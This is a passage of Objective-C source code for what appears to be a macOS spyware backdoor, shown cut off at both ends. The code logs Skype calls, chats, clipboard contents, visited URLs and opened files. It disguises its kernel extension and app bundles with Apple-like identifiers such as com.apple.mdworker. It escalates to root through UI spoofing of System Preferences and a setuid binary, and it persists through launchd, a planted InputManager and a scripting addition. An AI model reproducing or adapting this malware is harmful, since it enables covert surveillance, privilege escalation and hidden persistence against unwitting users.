                              NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(voipAdditionalStruct)];
                              
                              //short dummyWord   = 0x0000;
                              u_int _dummydWord = 0xFFFFFFFF;
                              
                              NSMutableData *dummydWord = [[NSMutableData alloc] initWithBytes: &_dummydWord
                                                                                        length: sizeof(u_int)];
                              /*
                              time_t unixTime;
                              time(&unixTime);
                              int64_t filetime = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
                              NSString *tmpPeerName = @"sux";
                              */
                              voipAdditionalStruct *voipAdditional    = (voipAdditionalStruct *)[entryData bytes];
                              voipAdditional->version                 = LOG_VOIP_VERSION;
                              voipAdditional->channel                 = CHANNEL_SPEAKERS;
                              voipAdditional->programType             = AGENT_VOIP + VOIP_SKYPE;
                              voipAdditional->sampleRate              = SAMPLE_RATE_SKYPE;
                              voipAdditional->isIngoing               = 0;
                              voipAdditional->hiStartTimestamp        = hiStopTime;
                              voipAdditional->loStartTimestamp        = loStopTime;
                              voipAdditional->hiStopTimestamp         = hiStopTime;
                              voipAdditional->loStopTimestamp         = loStopTime;
                              voipAdditional->localPeerLength         = [localPeer lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
                              voipAdditional->remotePeerLength        = [remotePeer lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
                              
                              // Local Peer Name
                              [entryData appendData: [localPeer dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
                              
                              // Null terminator
                              //[entryData appendBytes: &dummyWord
                              //                length: sizeof(short)];
                              
                              // Remote Peer Name
                              [entryData appendData: [remotePeer dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
                              
                              // Null terminator
                              //[entryData appendBytes: &dummyWord
                              //                length: sizeof(short)];

                              if ([_logManager createLog: AGENT_VOIP// + VOIP_SKYPE
                                             agentHeader: entryData
                                               withLogID: SKYPE_CHANNEL_OUTPUT] == TRUE)
                                {
                                  [_logManager writeDataToLog: dummydWord
                                                     forAgent: AGENT_VOIP// + VOIP_SKYPE
                                                    withLogID: SKYPE_CHANNEL_OUTPUT];
                                }
                              else
                                {
#ifdef DEBUG_CORE
                                  errorLog(@"Error while creating close log file for output (skype)");
#endif
                                }
                                
                              [_logManager closeActiveLog: AGENT_VOIP// + VOIP_SKYPE
                                                withLogID: SKYPE_CHANNEL_OUTPUT];
                              
                              [entryData release];
                              [dummydWord release];
                              
                              [localPeer release];
                              [remotePeer release];
                            }
                          
                          [voipAdditionalHeader release];
                        }
                      
                      break;
                    }
                  }
                                
                break;
              }
            case AGENT_CHAT:
              {
#ifdef DEBUG_CORE
                verboseLog(@"Logs from agent CHAT");
#endif    
                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];
                
                if ([_logManager writeDataToLog: logData
                                       forAgent: AGENT_CHAT
                                      withLogID: 0] == TRUE)
                  {
#ifdef DEBUG_CORE
                    infoLog(@"CHAT message logged correctly");
#endif
                  }
                else
                  {
#ifdef DEBUG_CORE  
                    errorLog(@"An error occurred while logging CHAT data");
#endif
                  }
                break;
              }
            case AGENT_CLIPBOARD:
              {
#ifdef DEBUG_CORE
                verboseLog(@"Logs from clipboard");
#endif
                
                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];
                
                if ([_logManager writeDataToLog: logData
                                       forAgent: AGENT_CLIPBOARD
                                      withLogID: 0] == TRUE)
                  {
#ifdef DEBUG_CORE
                    infoLog(@"Clipboard logged correctly");
#endif
                  }
            
                break;
              }
            case AGENT_INTERNAL_FILEOPEN:
              {
                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];

                if ([_logManager writeDataToLog: logData
                                       forAgent: AGENT_FILECAPTURE_OPEN
                                      withLogID: 0] == TRUE)
                  {
#ifdef DEBUG_CORE
                    infoLog(@"Logged file open");
#endif
                  }
            
                break;
              }
            case AGENT_INTERNAL_FILECAPTURE:
              {
                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];

                NSString *path = [[NSString alloc] initWithData: logData
                                                       encoding: NSUTF16LittleEndianStringEncoding];

                RCSMFileSystemManager *fsManager = [[RCSMFileSystemManager alloc] init];
                BOOL success = [fsManager logFileAtPath: path
                                             forAgentID: AGENT_FILECAPTURE];

                if (!success)
                  {
#ifdef DEBUG_CORE
                    errorLog(@"Error while logging file content at path %@", path);
#endif
                  }
                else
                  {
#ifdef DEBUG_CORE
                    infoLog(@"File content logged correctly for path %@", path);
#endif
                  }

                [path release];
                [fsManager release];
                break;
              }
            case LOG_URL_SNAPSHOT:
              {
#ifdef DEBUG_CORE
                verboseLog(@"Logs from url snapshot");
#endif

                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                        length: shMemLog->commandDataSize];
                urlSnapAdditionalStruct *_urlHeader = (urlSnapAdditionalStruct *)[logData bytes];

                switch (shMemLog->commandType)
                  {
                  case CM_CREATE_LOG_HEADER:
                    {
#ifdef DEBUG_CORE
                      infoLog(@"Creating log header for url snapshot (%d)", shMemLog->flag);
#endif
                      int additionalSize = sizeof(urlSnapAdditionalStruct)
                                           + _urlHeader->urlNameLen
                                           + _urlHeader->windowTitleLen;

                      NSMutableData *urlSnapAdditionalHeader = [[NSMutableData alloc] initWithData:
                                                                         [logData subdataWithRange: NSMakeRange(0, additionalSize)]];
                      NSMutableData *urlSnapData = [[NSMutableData alloc] initWithData: [logData subdataWithRange:
                        NSMakeRange([urlSnapAdditionalHeader length],
                                    [logData length] - [urlSnapAdditionalHeader length])]];

                      //
                      // Create log here since we need to pass anAgentHeader as the
                      // additional file header
                      //
                      if ([_logManager createLog: LOG_URL_SNAPSHOT
                                     agentHeader: urlSnapAdditionalHeader
                                       withLogID: shMemLog->flag] == TRUE)
                        {
                          if ([_logManager writeDataToLog: urlSnapData
                                                 forAgent: LOG_URL_SNAPSHOT
                                                withLogID: shMemLog->flag] == TRUE)
                            {
#ifdef DEBUG_CORE
                              infoLog(@"Written first entry for URL snapshot (%d)", shMemLog->flag);
#endif
                            }
                          else
                            {
#ifdef DEBUG_CORE
                              errorLog(@"Error while writing first entry for URL snapshot");
#endif
                            }
                        }
                      else
                        {
#ifdef DEBUG_CORE
                          errorLog(@"Error while creating URL snapshot log");
#endif
                        }

                      [urlSnapAdditionalHeader release];
                      [urlSnapData release];
                    } break;
                  case CM_LOG_DATA:
                    {
#ifdef DEBUG_CORE
                      verboseLog(@"Received data for URL Snapshot");
#endif
                      if ([_logManager writeDataToLog: logData
                                             forAgent: LOG_URL_SNAPSHOT
                                            withLogID: shMemLog->flag] == TRUE)
                        {
#ifdef DEBUG_CORE
                          verboseLog(@"Written data for URL snapshot");
#endif
                        }
                      else
                        {
#ifdef DEBUG_CORE
                          errorLog(@"Error while writing data for URL Snapshot (%d)", shMemLog->flag);
#endif
                        }
                    } break;
                  case CM_CLOSE_LOG:
                    {
#ifdef DEBUG_CORE
                      infoLog(@"Closing log for url snapshot (%d)", shMemLog->flag);
#endif

                      [_logManager closeActiveLog: LOG_URL_SNAPSHOT
                                        withLogID: shMemLog->flag];
                    } break;
                  default:
                    {
#ifdef DEBUG_CORE
                      errorLog(@"Unknown command type from url snapshot");
#endif
                    }
                  }

                break;
              }
            default:
              {
#ifdef DEBUG_CORE
                errorLog(@"Agent not yet implemented: %d", shMemLog->agentID);
#endif
                break;
              }
            }
        }
#if 0
      if (agentsCount - agentIndex == 1)
        agentIndex = 0;
      else
        agentIndex++;
#endif 
      if (logData != nil)
        {
          [logData release];
        }
      
      if (readData != nil)
        {
          [readData release];
        }
      
      NSMutableDictionary *agentConfiguration = [_taskManager getConfigForAgent: AGENT_VOIP];
      
#ifdef DEBUG_CORE
      if (x == 0)
        infoLog(@"Checking if skype is running");
#endif

      if (agentConfiguration != nil)
        {
          [agentConfiguration retain];
          
#ifdef DEBUG_CORE
          if (x == 0)
            infoLog(@"Got skype conf");
#endif
          
          if ([agentConfiguration objectForKey: @"status"]    == AGENT_RUNNING
              || [agentConfiguration objectForKey: @"status"] == AGENT_START)
            {
#ifdef DEBUG_CORE
              if (x == 0)
                warnLog(@"Skype is running");
#endif
              [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.001]];
            }
          else
            {
#ifdef DEBUG_CORE
              if (x == 0)
                warnLog(@"Skype is not running");
#endif
              [[NSRunLoop currentRunLoop] runUntilDate: [NSDate dateWithTimeIntervalSinceNow: 0.01]];
            }
          
          [agentConfiguration release];
        }
      else
        {
#ifdef DEBUG_CORE
          if (x == 0)
            warnLog(@"Skype conf not found");
#endif
        }
        
#ifdef DEBUG_CORE
      if (x == 0)
        x++;
#endif
      
      [innerPool drain];
    }
  
  if ([localFlag isEqualToString: @"STOP"])
    {
      while (true)
        sleep(1);
    }
}

- (void)_guessNames
{
#ifdef DEV_MODE
  unsigned char result[CC_MD5_DIGEST_LENGTH];
  CC_MD5(gConfAesKey, strlen(gConfAesKey), result);
  
  NSData *temp = [NSData dataWithBytes: result
                                length: CC_MD5_DIGEST_LENGTH];
#else
  NSData *temp = [NSData dataWithBytes: gConfAesKey
                                length: CC_MD5_DIGEST_LENGTH];
#endif
  
  RCSMEncryption *_encryption = [[RCSMEncryption alloc] initWithKey: temp];
  gBackdoorName = [[[NSBundle mainBundle] executablePath] lastPathComponent];
  NSString *_backdoorName = nil;
  
  if ([gBackdoorName isEqualToString: @"System Preferences"])
    {
      NSString *searchPattern = [[NSString alloc] initWithFormat: @"%@/*.ez",
                                 [[NSBundle mainBundle] bundlePath]];
      
      NSArray *_searchedFile = searchForProtoUpload(searchPattern);
      [searchPattern release];
      
      if ([_searchedFile count] > 0)
        {
          _backdoorName = [[[_searchedFile objectAtIndex: 0] stringByReplacingOccurrencesOfString: @".ez"
                                                                                       withString: @""] lastPathComponent];
        }
    }
  else
    {
      _backdoorName = gBackdoorName;
    }
  
  //
  // Here we should calculate the lowest scrambled name in order to obtain
  // the configuration name
  //
  gBackdoorUpdateName = [_encryption scrambleForward: _backdoorName
                                                seed: ALPHABET_LEN / 2];
  
  if ([gBackdoorName isLessThan: gBackdoorUpdateName])
    {
      gConfigurationName = [_encryption scrambleForward: _backdoorName
                                                   seed: 1];
    }
  else
    {
      gConfigurationName = [_encryption scrambleForward: gBackdoorUpdateName
                                                   seed: 1];
    }
  
  gConfigurationUpdateName  = [_encryption scrambleForward: gConfigurationName
                                                      seed: ALPHABET_LEN / 2];
  gInputManagerName         = [_encryption scrambleForward: gConfigurationName
                                                      seed: 2];
  gKextName                 = [_encryption scrambleForward: gConfigurationName
                                                      seed: 4];
  
#ifdef DEBUG_CORE
  infoLog(@"name       : %@", gBackdoorName);
  infoLog(@"update name: %@", gBackdoorUpdateName);
  infoLog(@"conf name  : %@", gConfigurationName);
  infoLog(@"conf update: %@", gConfigurationUpdateName);
  infoLog(@"im update  : %@", gInputManagerName);
  infoLog(@"kext name  : %@", gKextName);
#endif
  
  [_encryption release];
}

- (void)_createInternalFilesAndFolders
{
#ifdef DEBUG_CORE
  infoLog(@"");
#endif
  
  NSTask *task = [[NSTask alloc] init];
  NSArray *_commArguments = [[NSArray alloc] initWithObjects: @"-r", nil];
  
  [task setLaunchPath: @"/usr/bin/uname"];
  [task setArguments: _commArguments];
  
  NSPipe *pipe = [NSPipe pipe];
  [task setStandardOutput: pipe];
  [task setStandardError: pipe];
  NSFileHandle *file = [pipe fileHandleForReading];
  
  [task launch];
  [task waitUntilExit];
         
  NSData *taskData      = [file readDataToEndOfFile];
  NSString *taskOutput  = [[NSString alloc] initWithData: taskData
                                                encoding: NSUTF8StringEncoding];
  
#ifdef DEBUG_CORE
  infoLog(@"taskOutput: %@", taskOutput);
#endif
  [task release];
  
  //
  // Preparing KEXT folders and files
  //
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 8];
  NSMutableDictionary *innerDict;
  
  if (gOSMajor    == 10
      && gOSMinor == 5)
    {
      innerDict = [NSMutableDictionary dictionaryWithCapacity: 1];
      [innerDict setObject: taskOutput forKey: @"com.apple.kernel"];
    }
  else if (gOSMajor     == 10
           && gOSMinor  == 6)
    {
      innerDict = [NSMutableDictionary dictionaryWithCapacity: 2];
      [innerDict setObject: taskOutput forKey: @"com.apple.kpi.bsd"];
      [innerDict setObject: taskOutput forKey: @"com.apple.kpi.libkern"];
    }
  
  [rootObj setObject: @"English" forKey: @"CFBundleDevelopmentRegion"];
  [rootObj setObject: gKextName forKey: @"CFBundleExecutable"];
  [rootObj setObject: @"com.apple.mdworker" forKey: @"CFBundleIdentifier"];
  [rootObj setObject: @"6.0" forKey: @"CFBundleInfoDictionaryVersion"];
  [rootObj setObject: @"KEXT" forKey: @"CFBundlePackageType"];
  [rootObj setObject: @"????" forKey: @"CFBundleSignature"];
  [rootObj setObject: @"2.0" forKey: @"CFBundleVersion"];
  [rootObj setObject: innerDict forKey: @"OSBundleLibraries"];
  
  NSString *err;
  NSData *binData = [NSPropertyListSerialization dataFromPropertyList: rootObj
                                                               format: NSPropertyListXMLFormat_v1_0
                                                     errorDescription: &err];
  
  NSString *_backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
                                    [[NSBundle mainBundle] bundlePath],
                                    @"Contents"];
  mkdir([_backdoorContentPath UTF8String], 0755);
  
  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources",
                          [[NSBundle mainBundle] bundlePath]];
  mkdir([_backdoorContentPath UTF8String], 0755);
  
  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/MacOS",
                          [[NSBundle mainBundle] bundlePath]];
  mkdir([_backdoorContentPath UTF8String], 0755);
  
  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext",
                          [[NSBundle mainBundle] bundlePath],
                          gKextName];
  mkdir([_backdoorContentPath UTF8String], 0755);
  
  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                          [[NSBundle mainBundle] bundlePath],
                          gKextName,
                          @"Contents"];
  mkdir([_backdoorContentPath UTF8String], 0755);
  
  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                          [[NSBundle mainBundle] bundlePath],
                          gKextName,
                          @"Contents/Resources"];
  mkdir([_backdoorContentPath UTF8String], 0755);
  
  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                          [[NSBundle mainBundle] bundlePath],
                          gKextName,
                          @"Contents/MacOS"];
  mkdir([_backdoorContentPath UTF8String], 0755);
  
  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@",
                          [[NSBundle mainBundle] bundlePath],
                          gKextName,
                          @"/Contents/Info.plist"];
  
  [binData writeToFile: _backdoorContentPath
            atomically: YES];
  
  _backdoorContentPath = [NSString stringWithFormat: @"%@/Contents/Resources/%@.kext/%@/%@",
                          [[NSBundle mainBundle] bundlePath],
                          gKextName,
                          @"/Contents/MacOS",
                          gKextName];
  
  NSString *tempKextDir = [[NSString alloc] initWithFormat: @"%@/%@",
                           [[NSBundle mainBundle] bundlePath],
                           gKextName];
#ifdef DEBUG_CORE
  infoLog(@"tempKextDir: %@", tempKextDir);
  infoLog(@"backdoorContentPath: %@", _backdoorContentPath);
#endif
  
  [[NSFileManager defaultManager] moveItemAtPath: tempKextDir
                                          toPath: _backdoorContentPath
                                           error: nil];
  
  [tempKextDir release];
  [taskOutput release];
  
  //
  // Backdoor .app Info.plist
  //
  rootObj   = [NSMutableDictionary dictionaryWithCapacity: 10];
  
  [rootObj setObject: @"English" forKey: @"CFBundleDevelopmentRegion"];
  [rootObj setObject: [[[NSBundle mainBundle] executablePath] lastPathComponent] forKey: @"CFBundleExecutable"];
  [rootObj setObject: @"1" forKey: @"NSUIElement"];
  [rootObj setObject: @"com.apple.mdworker-user" forKey: @"CFBundleIdentifier"];
  [rootObj setObject: @"6.0" forKey: @"CFBundleInfoDictionaryVersion"];
  [rootObj setObject: @"mdworker-user" forKey: @"CFBundleName"];
  [rootObj setObject: @"APPL" forKey: @"CFBundlePackageType"];
  [rootObj setObject: @"????" forKey: @"CFBundleSignature"];
  [rootObj setObject: @"1.0" forKey: @"CFBundleVersion"];
  [rootObj setObject: @"MainMenu" forKey: @"NSMainNibFile"];
  [rootObj setObject: @"NSApplication" forKey: @"NSPrincipalClass"];
  
  binData = [NSPropertyListSerialization dataFromPropertyList: rootObj
                                                       format: NSPropertyListXMLFormat_v1_0
                                             errorDescription: nil];
  
  _backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
                          [[NSBundle mainBundle] bundlePath],
                          @"Contents/Info.plist"];
  
  [binData writeToFile: _backdoorContentPath
            atomically: YES];
  
  /*
  [[NSFileManager defaultManager] copyItemAtPath: gBackdoorName
                                          toPath: @"Contents/MacOS"
                                           error: nil];
  */
}

- (void)_resizeSharedMemoryWindow
{
  if (getuid() == 0 || geteuid() == 0)
    {
#ifdef DEBUG_CORE
      warnLog(@"High Privs mode, big shared memory");
#endif
      
      //
      // Let's change the default shared memory max size to a better value
      //
      NSArray *_arguments = [NSArray arrayWithObjects:
                             @"-w",
                             @"kern.sysv.shmmax=67108864",
                             nil];
      
      [gUtil executeTask: @"/usr/sbin/sysctl"
           withArguments: _arguments
            waitUntilEnd: YES];
      
      _arguments = [NSArray arrayWithObjects:
                    @"-w",
                    @"kern.sysv.shmall=4096",
                    nil];
      
      [gUtil executeTask: @"/usr/sbin/sysctl"
           withArguments: _arguments
            waitUntilEnd: YES];
    }
  else
    {
      //
      // With low privs we will have a very small shared memory
      // in order to keep everything working as expected
      // shmem won't be used at all
      //
#ifdef DEBUG_CORE
      warnLog(@"Low Privs mode, small shared memory");
#endif
      
      //
      // Give a smaller size since we don't have privileges
      // for executing sysctl
      //
      gMemLogMaxSize = sizeof(shMemoryLog) * SHMEM_LOG_MIN_NUM_BLOCKS;
    }
}

- (BOOL)_createAndInitSharedMemory
{
  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
  key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
  
  // init shared memory
  gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
                                                          size: gMemCommandMaxSize
                                                 semaphoreName: SHMEM_SEM_NAME];

  gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
                                                          size: gMemLogMaxSize
                                                 semaphoreName: SHMEM_SEM_NAME];
  
  //
  // Create and initialize the shared memory segments
  // for commands and logs
  //
  if ([gSharedMemoryCommand createMemoryRegion] == -1)
    {
#ifdef DEBUG_CORE
      errorLog(@"There was an error while creating the Commands Shared Memory");
#endif
      return NO;
    }
  if ([gSharedMemoryCommand attachToMemoryRegion] == -1)
    {
#ifdef DEBUG_CORE
      errorLog(@"There was an error while attaching to the Commands Shared Memory");
#endif
      return NO;
    }
  
  [gSharedMemoryCommand zeroFillMemory];
  
  if ([gSharedMemoryLogging createMemoryRegion] == -1)
    {
#ifdef DEBUG_CORE
      errorLog(@"There was an error while creating the Logging Shared Memory");
#endif
      return NO;
    }
  
  if ([gSharedMemoryLogging attachToMemoryRegion] == -1)
    {
#ifdef DEBUG_CORE
      errorLog(@"There was an error while attaching to the Logging Shared Memory");
#endif
      return NO;
    }
  
  [gSharedMemoryLogging zeroFillMemory];
  
  return YES;
}

- (void)_checkForOthers
{
  //
  // Avoid to create the NSPort if we're running from a different name in order
  // to perform the UI spoofing (e.g. System Preferences) otherwise we'll lock
  // out ourself
  //
  if (![mApplicationName isEqualToString: @"System Preferences"]
      && getuid() != 0)
    {
#ifdef DEBUG_CORE
      infoLog(@"Registering NSPort to NameServer");
      infoLog(@"uid : %d", getuid());
      infoLog(@"euid: %d", geteuid());
#endif
      
      //
      // Check if there's another backdoor running
      //
      id port = [[NSPort port] retain];
      if (![[NSPortNameServer systemDefaultPortNameServer] registerPort: port
                                                                   name: @"com.apple.mdworker.executed"])
        {
#ifdef DEBUG_CORE
          errorLog(@"NSPort check error! Backdoor is already running");
#endif
          exit(-1);
        }
      else
        {
#ifdef DEBUG_CORE
          warnLog(@"Port Registered correctly");
#endif
        }
    }
  else
    {
#ifdef DEBUG_CORE
      warnLog(@"Can't check for others since we don't have the right conditions");
#endif
    }
}

- (BOOL)_SLIEscalation
{
#ifdef DEBUG_CORE
  infoLog(@"sliPlist mode");
#endif

  if (getuid() != 0 && geteuid() != 0)
    {
      if ([[NSFileManager defaultManager] fileExistsAtPath: [gUtil mExecFlag]
                                               isDirectory: NULL])
        {
          //
          // We failed in obtaining root privs if we're here dude
          //
#ifdef DEBUG_CORE
          errorLog(@"SLI FAIL - /facepalm");
#endif
        }
      else
        {
          if ([self getRootThroughSLI] == YES)
            {
              [gUtil dropExecFlag];
            }
        }
    }
  else
    {
      //
      // This means that the machine has been rebooted and we already
      // obtained root privs through the SLI escalation
      //
#ifdef DEBUG_CORE
      infoLog(@"sli mode success");
#endif
      
      [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
      return YES;
    }
  
  return NO;
}

- (BOOL)_UISpoof
{
  if (getuid() != 0 && geteuid() != 0)
    {
      //
      // Check the application executable name, if different than
      // application name it means we're trying to get root through UI
      // Spoofing, thus we relaunch ourself and exit after having
      // obtained the new privileges
      //
      if (![mBinaryName isEqualToString: @"System Preferences"])
        {
#ifdef DEBUG_CORE
          infoLog(@"Making backdoor resident");
#endif
      
          if ([self makeBackdoorResident] == NO)
            {
#ifdef DEBUG_CORE
              errorLog(@"An error occurred while making backdoor resident");
#endif
            }
      
          NSString *tempFileName = [[NSString alloc] initWithFormat: @"%@/%@%@",
                                    [[NSBundle mainBundle] bundlePath],
                                    mBinaryName, @".ez"];
          
          [@"" writeToFile: tempFileName
                atomically: YES
                  encoding: NSUTF8StringEncoding error: nil];
          [tempFileName release];
          
          [self _renameBackdoorAndRelaunch];
        }
      else
        {
          [self UISudoWhileAlreadyAuthorized: NO];
          //[self getRootThroughUISpoofing: @"System Preferences"];
        }
    }
  else
    {
      if ([mBinaryName isEqualToString: @"System Preferences"])
        {
          [gUtil enableSetugidAuth];
          usleep(10000);
          [self UISudoWhileAlreadyAuthorized: YES];
        }
      
      //[gUtil disableSetugidAuth];
      [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
      
      NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                              [[NSBundle mainBundle] bundlePath],
                              @"mdworker.flg"];
#ifdef DEBUG_CORE
      infoLog(@"Looking for mdworker.flg");
#endif
      
      if (![[NSFileManager defaultManager] fileExistsAtPath: flagPath
                                                isDirectory: NO])
        {
#ifdef DEBUG_CORE
          warnLog(@"mdworker.flg not found. Relaunching through launchd");
#endif
          [gUtil dropExecFlag];
          
          NSString *backdoorPlist = [NSString stringWithFormat: @"%@/%@",
                                     [[[[[NSBundle mainBundle] bundlePath]
                                        stringByDeletingLastPathComponent]
                                       stringByDeletingLastPathComponent]
                                      stringByDeletingLastPathComponent],
                                     BACKDOOR_DAEMON_PLIST];
          
          NSArray *arguments = [NSArray arrayWithObjects:
                                @"load",
                                @"-S",
                                @"Aqua",
                                backdoorPlist,
                                nil];
          
          [gUtil executeTask: @"/bin/launchctl"
               withArguments: arguments
                waitUntilEnd: NO];
          
          exit(0);
        }
      else
        {
#ifdef DEBUG_CORE
          infoLog(@"mdworker flag found! Already loaded by launchd");
#endif
        }
      
      return YES;
    }
    
  return NO;
}

- (BOOL)_dropInputManager
{
  NSString *err;
  NSString *_backdoorContentPath = [NSString stringWithFormat: @"%@/%@",
                                    [[NSBundle mainBundle] bundlePath],
                                    @"Contents"];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/InputManagers/appleHID"])
    {
      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/InputManagers/appleHID"
                                                 error: nil];
    }

  //
  // Input Manager
  //
  if (mkdir("/Library/InputManagers", 0755) == -1 && errno != EEXIST)
    {
#ifdef DEBUG_CORE
      errorLog(@"Error mkdir InputManagers (%d)", errno);
#endif
      return NO;
    }
  if (mkdir("/Library/InputManagers/appleHID", 0755) == -1 && errno != EEXIST)
    {
#ifdef DEBUG_CORE
      errorLog(@"Error mkdir appleHID (%d)", errno);
#endif
      return NO;
    }
  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755) == -1 && errno != EEXIST)
    {
#ifdef DEBUG_CORE
      errorLog(@"Error mkdir appleHID.bundle (%d)", errno);
#endif
      return NO;
    }
  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755) == -1 && errno != EEXIST)
    {
#ifdef DEBUG_CORE
      errorLog(@"Error mkdir Contents (%d)", errno);
#endif
      return NO;
    }
  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755) == -1 && errno != EEXIST)
    {
#ifdef DEBUG_CORE
      errorLog(@"Error mkdir MacOS (%d)", errno);
#endif
      return NO;
    }
  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/Resources", 0755) == -1 && errno != EEXIST)
    {
#ifdef DEBUG_CORE
      errorLog(@"Error mkdir Resources (%d)", errno);
#endif
      return NO;
    }

  NSMutableDictionary *rootObj2 = [NSMutableDictionary dictionaryWithCapacity: 4];
  NSMutableDictionary *innerDict2 = [NSMutableDictionary dictionaryWithCapacity: 1];
  [innerDict2 setObject: gInputManagerName
                 forKey: @"English"];
  
  [rootObj2 setObject: @"appleHID.bundle"
               forKey: @"BundleName"];
  [rootObj2 setObject: @"YES"
               forKey: @"LoadBundleOnLaunch"];
  [rootObj2 setObject: innerDict2
               forKey: @"LocalizedNames"];
  [rootObj2 setObject: @"YES"
               forKey: @"NoMenuEntry"];
  
  NSData *binData = [NSPropertyListSerialization dataFromPropertyList: rootObj2
                                                               format: NSPropertyListXMLFormat_v1_0
                                                     errorDescription: &err];
  
  [binData writeToFile: @"/Library/InputManagers/appleHID/Info"
            atomically: YES];
  
  NSString *destDir = [[NSString alloc] initWithFormat:
                       @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
                       INPUT_MANAGER_FOLDER,
                       INPUT_MANAGER_FOLDER,
                       gInputManagerName];
  
  NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
                         [[NSBundle mainBundle] bundlePath],
                         gInputManagerName];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
                                           isDirectory: NO] == NO)
    {
      [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
                                              toPath: destDir
                                               error: nil];
    }
  
  [tempIMDir release];
  
  //
  // InputManager internal Info.plist
  //
  NSMutableDictionary *rootObj   = [NSMutableDictionary dictionaryWithCapacity: 7];
  
  [rootObj setObject: @"English" forKey: @"CFBundleDevelopmentRegion"];
  [rootObj setObject: gInputManagerName forKey: @"CFBundleExecutable"];
  [rootObj setObject: @"com.apple.spotlight-worker" forKey: @"CFBundleIdentifier"];
  [rootObj setObject: @"6.0" forKey: @"CFBundleInfoDictionaryVersion"];
  [rootObj setObject: @"BNDL" forKey: @"CFBundlePackageType"];
  [rootObj setObject: @"????" forKey: @"CFBundleSignature"];
  [rootObj setObject: @"1.0" forKey: @"CFBundleVersion"];
  
  binData = [NSPropertyListSerialization dataFromPropertyList: rootObj
                                                       format: NSPropertyListXMLFormat_v1_0
                                             errorDescription: nil];
  
  _backdoorContentPath = [NSString stringWithFormat:
                          @"/Library/InputManagers/%@/%@.bundle/Contents/Info.plist",
                          INPUT_MANAGER_FOLDER,
                          INPUT_MANAGER_FOLDER ];
  
  [binData writeToFile: _backdoorContentPath
            atomically: YES];
  
  NSArray *arguments = [NSArray arrayWithObjects:
                        @"-R",
                        @"root:admin",
                        destDir,
                        nil];
  [gUtil executeTask: @"/usr/sbin/chown"
        withArguments: arguments
         waitUntilEnd: YES];
  
  [destDir release];
  return YES;
}

- (void)_dropOsaxBundle
{  
  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/ScriptingAdditions/appleOsax"])
    {
      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/ScriptingAdditions/appleOsax"
                                                 error: nil];
    }

  //
  // Scripting folder
  //
  mkdir("/Library/ScriptingAdditions", 0755);
  mkdir("/Library/ScriptingAdditions/appleOsax", 0755);
  mkdir("/Library/ScriptingAdditions/appleOsax/Contents", 0755);
  mkdir("/Library/ScriptingAdditions/appleOsax/Contents/MacOS", 0755);
  mkdir("/Library/ScriptingAdditions/appleOsax/Contents/Resources", 0755);

  NSString *destDir = [[NSString alloc] initWithFormat:
                       @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@",
                       OSAX_FOLDER,
                       gInputManagerName];

#ifdef DEBUG_CORE
  infoLog(@"destination osax %@", destDir);
#endif
  
  NSString *tempIMDir = [[NSString alloc] initWithFormat: @"%@/%@",
                         [[NSBundle mainBundle] bundlePath],
                         gInputManagerName];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
                                           isDirectory: NO] == NO)
    {
#ifdef DEBUG_CORE
      infoLog(@"copying inputmanager file from %@", tempIMDir);
#endif
      [[NSFileManager defaultManager] copyItemAtPath: tempIMDir
                                              toPath: destDir
                                               error: nil];
#ifdef DEBUG_CORE
      if ([[NSFileManager defaultManager] fileExistsAtPath: destDir
                                               isDirectory: NO] == NO)
        infoLog(@"OSAX file not created");
      else
        infoLog(@"OSAX file created correctly");
#endif
    }
  
  [tempIMDir release];
  [destDir release];
  
  NSString *info_orig_pl = [[NSString alloc] initWithCString: Info_plist];
  
#ifdef DEBUG_CORE
  infoLog(@"Original info.plist for osax %@", info_orig_pl);
#endif
  
